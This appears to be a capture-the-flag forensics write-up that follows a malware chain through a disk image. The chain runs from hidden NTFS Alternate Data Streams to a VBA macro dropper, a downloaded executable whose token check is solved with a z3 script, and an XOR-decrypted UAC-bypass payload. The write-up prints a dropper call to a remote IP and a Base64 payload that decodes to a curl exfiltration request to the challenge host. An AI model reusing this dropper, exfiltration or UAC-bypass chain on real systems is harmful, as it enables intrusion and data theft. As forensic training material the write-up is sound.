# Google ADSense
> Who looked at our $11.48 monthly AdSense revenue and decided we needed to hire people to boost it?
## Solution
- We are given an evidence.vhd file. I download and open it and i can see many folders and files.
- We know that we need to use ADS (Alternate Data Streams) as hinted by the question. A lot of the files use ADS and they have some strings
- In the resumes folder, in the GoogleAdsSpecialistResume.pdf (it has a very big ADS stream). We extract and get JPEG-XL file
- On opening, cannot open since it is a corrupt file. so we open in Hex editor and see the header. It shows that it is actually a .doc file so i change it to that
- On opening this, we get a lot of text (it...doesnt make sense)
- Now, we use `oblevba` and see a Module6 and XOR-based string obfuscation `XORObfs`. We manually XOR it to get that the document is a malware dropper which reads ADS streams from the `Resumes` folder
- It also concatenates selected ADS content and sends ciphertext and key to an API function `http://137.32.34.67/NiteDecrypt.AES256_CBC_NOPAD_NO_IV_Key(ct,key)`
- Doing macro analysis we get the files used, ADS streams, key location and concatenation order.
- We get 5 files with the following content:
   - tdceq0cizXmLzB23PFRG
   - kew4y9jXv3o953S
   - q1+aCxzRfwwEeXL/fukbdBFRZ
   - ey8ySPw90EPjVoqF4M
   - /zm8kZGkDnpVFXGT3/I/QmJ8EE/MsPkGJxuiU1UNwz2qY8amli
- We join these and get `tdceq0cizXmLzB23PFRGkew4y9jXv3o953Sq1+aCxzRfwwEeXL/fukbdBFRZey8ySPw90EPjVoqF4M/zm8kZGkDnpVFXGT3/I/QmJ8EE/MsPkGJxuiU1UNwz2qY8amli`
- (we also get a wrong flag here called `nite{us3l3ss_but_y0u_n3v3r_kn0w}` from another file)
- we use AES-256-CBC decryption locally using `pycryptodome` and get `https://github.com/adsensenite/adsensetoken/releases/download/v7/adsense_token.exe`
- The malware gives us a GitHub release executable `adsense_token.exe` which we need to reverse engineer. We are asked for a token and whatever we enter, we get "incorrect token". So now we take a look at the binary.
   - our main function is `sub_1400034A0`
   - <img width="564" height="167" alt="image" src="https://github.com/user-attachments/assets/ad8d1770-7cfa-4319-9e0e-2cdd6e3c7cb2" />
   - input is stored in `String`, passed to the main function, where it is validated (we need to look at the validations to get the correct token)
   - also, a hash check is done at funtion `sub_140001A5D` which checks if the input has a md5 hash of `5a51c90d12681dd8bb75d00ec1d37a96`
```
import z3
from hashlib import md5

def solve():
    s = z3.Solver()

    d = [z3.Int(f'd_{i}') for i in range(16)]

    for i in range(16):
        s.add(d[i] >= 0, d[i] <= 9)

    # sums of groups of 4
    s.add(d[0] + d[1] + d[2] + d[3] == 15)
    s.add(d[4] + d[5] + d[6] + d[7] == 9)
    s.add(d[8] + d[9] + d[10] + d[11] == 17)
    s.add(d[12] + d[13] + d[14] + d[15] == 16)

    # hardcoded 0 positions
    for idx in [2, 4, 6, 10, 12, 14]:
        s.add(d[idx] == 0)

    # product of non zero elements
    targets = [84, 8, 112, 63]
    for i in range(4):
        indices = range(i * 4, i * 4 + 4)
        terms = [z3.If(d[j] == 0, 1, d[j]) for j in indices]
        s.add(terms[0] * terms[1] * terms[2] * terms[3] == targets[i])

    for i in range(4):
        # Odd indexed pairs < 29
        s.add((d[i*4] * 10 + d[i*4+1]) < 29)
        # Even indexed pairs < 10
        s.add((d[i*4+2] * 10 + d[i*4+3]) < 10)

    # prime index sum
    prime_indices = [2, 3, 5, 7, 11, 13]
    s.add(sum(d[i] for i in prime_indices) == 29)

    # odd,even
    s.add(sum(z3.If(d[i] == 0, 0, z3.If(d[i] % 2 == 0, 1, -1)) for i in range(16)) == 0)

    target_hash = "5a51c90d12681dd8bb75d00ec1d37a96"

    # Iterate through valid models
    while s.check() == z3.sat:
        m = s.model()
        nums = "".join(str(m[d[i]]) for i in range(16))
        token = "pub-" + nums

        if md5(token.encode()).hexdigest() == target_hash:
            print(f"valid token: {token}")
            return

        # skip solution if hash doesnt match
        print(f"Checking: {token}")
        s.add(z3.Or([d[i] != m[d[i]] for i in range(16)]))

if __name__ == "__main__":
    solve()
 ```
- This script helps pass the token check. thus we get
- <img width="893" height="427" alt="image" src="https://github.com/user-attachments/assets/11a055c1-6893-479d-819c-1a6470bdf8e6" />
- Paint (`unk_1400BA188`) has encrypted things which is XORed with v14 (v14 is validated token). Then `cmd.exe` is gotten and bad code is executed.
- To decrypt this bad code, we use
  ```
  encrypted_data = [
    0x2, 0x10, 0x5, 0xd, 0x53, 0x53, 0x54, 0x16, 0x78, 0x73, 0x73, 0x64, 0x6e, 0x6b, 0x5f, 0x51, 0x44, 0x40, 0x51, 0x4b, 0x15, 0x29, 0x21, 0x41, 0x53, 0x44, 0x43, 0x53, 0x43, 0x64, 0x44, 0x50, 0x41, 0x53, 0x5d, 0x50, 0x42, 0x6b, 0x43, 0x51, 0x15, 0x19, 0xe, 0x71, 0x5d, 0x47, 0x55, 0x58, 0x6c, 0x5b, 0x5f, 0x5c, 0x5f, 0x59, 0x5e, 0x53, 0x10, 0x18, 0x46, 0x5c, 0x50, 0x5a, 0x16, 0xd, 0x60, 0x72, 0x77, 0x69, 0x63, 0x62, 0x10, 0x1e, 0x56, 0x18, 0x12, 0x47, 0x5f, 0x40, 0x55, 0x4b, 0x3, 0x1d, 0x7, 0x41, 0x5e, 0x19, 0x55, 0x4e, 0x55, 0x18, 0x1d, 0x7f, 0x5d, 0x68, 0x10, 0x1a, 0x7e, 0x58, 0x5e, 0x70, 0x50, 0x58, 0x35, 0xd, 0x7a, 0x5e, 0x54, 0x52, 0x55, 0x56, 0x10, 0x1c, 0x77, 0x40, 0x55, 0x54, 0x10, 0x75, 0x49, 0x49, 0x11, 0x6, 0x11, 0xd, 0x1f, 0x52, 0x5e, 0x55, 0x10, 0x62, 0x67, 0x7f, 0x5d, 0x5a, 0x49, 0x75, 0x45, 0x56, 0x68, 0x6b, 0x1c, 0x10, 0x18, 0x6b, 0x47, 0x6f, 0x3, 0x64, 0x5f, 0x75, 0x68, 0x7f, 0x54, 0x5c, 0x67, 0x4f, 0x0, 0x54, 0x5a, 0x6b, 0x16, 0x3b, 0x2a, 0x4e, 0x48, 0x54, 0x4a, 0x74, 0x44, 0x75, 0x1, 0x8, 0x45, 0x75, 0x3, 0x7d, 0x5d, 0x7a, 0x2, 0x77, 0x40, 0x2d, 0x51, 0x4e, 0x45, 0x54, 0x5d, 0x4e, 0x5b, 0x60, 0x3, 0x52, 0x4a, 0x5a, 0x77, 0x4f, 0x56, 0x53, 0x77, 0x5e, 0xa, 0x16, 0x8, 0x63, 0x54, 0x54, 0x3, 0x67, 0x48, 0x5a, 0x77, 0x49, 0x54, 0x61, 0x5a, 0x79, 0x56, 0x66, 0x65, 0x6b, 0x24, 0x2d, 0x18, 0x7f, 0x47, 0x6d, 0x76, 0xf, 0x66, 0x69, 0x65, 0x7f, 0x54, 0x69, 0x5c, 0x5b, 0x61, 0x66, 0x66, 0x77, 0x24, 0x25, 0x51, 0x1d, 0x55, 0x51, 0x73, 0x74, 0x60, 0x5c, 0x68, 0x60, 0x46, 0x6a, 0x5d, 0x5b, 0x43, 0x6d, 0x63, 0x7b, 0x34, 0x3a, 0xe, 0x55, 0x2, 0x6d, 0x67, 0x7, 0x47, 0x60, 0x77, 0x6b, 0x41, 0x61, 0x67, 0x54, 0x45, 0x53, 0x78, 0x51, 0x40, 0x3a, 0x1b, 0x6f, 0x58, 0x53, 0x68, 0x7c, 0x43, 0x71, 0x77, 0x59, 0x2, 0x5c, 0x78, 0x76, 0x6, 0x7b, 0x49, 0x0, 0x1d, 0x17, 0x51, 0x67, 0x5e, 0x55, 0x5e, 0x78, 0x40, 0x61, 0x3, 0x7c, 0x47, 0x5a, 0x5d, 0x5b, 0x0, 0x6d, 0x67, 0x77, 0x40, 0x2f, 0x8, 0x64, 0x3, 0x7b, 0x5d, 0x4e, 0x40, 0x5c, 0x5d, 0x64, 0x44, 0x62, 0x68, 0x5f, 0x5d, 0x56, 0x67, 0x4e, 0x5f, 0x2f, 0x25, 0x6b, 0x2, 0x6e, 0x64, 0x7, 0x1, 0x61, 0x67, 0x7f, 0x54, 0x61, 0x5e, 0x5b, 0x47, 0x6e, 0x68, 0x77, 0xa, 0x2d, 0x51, 0x63, 0x3, 0x6e, 0x2, 0x78, 0x5c, 0x5b, 0x3, 0x7f, 0x5f, 0x5c, 0x67, 0x40, 0xd, 0x15, 0x10, 0x16, 0x16, 0x55, 0x44, 0xb, 0x12, 0x44, 0x44, 0x57, 0x42, 0x4c, 0x10, 0x45, 0x53, 0x4b, 0x5b, 0x5a, 0x57, 0x45, 0x1e, 0x5c, 0x8, 0x10
  ]

  pin = "pub-2706080128070709"
  decrypted_data = []

  for i in range(len(encrypted_data)):
      decrypted_data.append(encrypted_data[i] ^ ord(pin[i % len(pin)]))

  print("".join(map(chr, decrypted_data)))
 

- We get an output which is a UAC bypass technique giving Base64 encoded payload `ZWNobyBuaXRlezFuX3RoMXNfdWx0cjRfNHczczBtM19wM3JmM2N0X3cwcmxkX3cxbGxfdGgzcjNfc3QxbGxfYjNfQURTXzRuZF9VQUNfQllQQVNTP30gfCBPdXQtRmlsZSBDOlx0ZW1wXGZsYWcudHh0OyBjdXJsIGh0dHA6Ly9mb3JlbnNpY3Mubml0ZWN0ZjI1LmxpdmUvZXhmaWw/ZGF0YT11YWNfYnlwYXNzX3N1Y2Nlc3NmdWw=`
- This we decode to get our flag

## Flag:
`nite{1n_th1s_ultr4_4w3s0m3_p3rf3ct_w0rld_w1ll_th3r3_st1ll_b3_ADS_4nd_UAC_BYPASS?}`

## Notes:
- `Alternate Data Streams (ADS)`: They are a feature of the Windows NTFS file system. you attach hidden data to files (compartments) for extra info like metadata, comments or malicious payloads like malware, keyloggers without changing the main file's size or appearance
- `olevba`: open-source Python tool used for malware analysis and forensics. We can extract, analyze, and display the VBA macros (Visual Basic for Applications) from Microsoft Office documents (like .doc, .xls, .ppt) and Outlook messages. It helps identify malicious code, suspicious functions, and risky elements in documents that might otherwise seem harmless.
- `Malware droppers` are malicious software designed to deliver and execute additional malware on a victim system and are employed to obfuscate final payloads during load and initial execution
- `UAC bypass techniques`: exploit features in the Windows OS to elevate a process's privileges from a standard user level to an administrator level without triggering a User Account Control (UAC) prompt
 
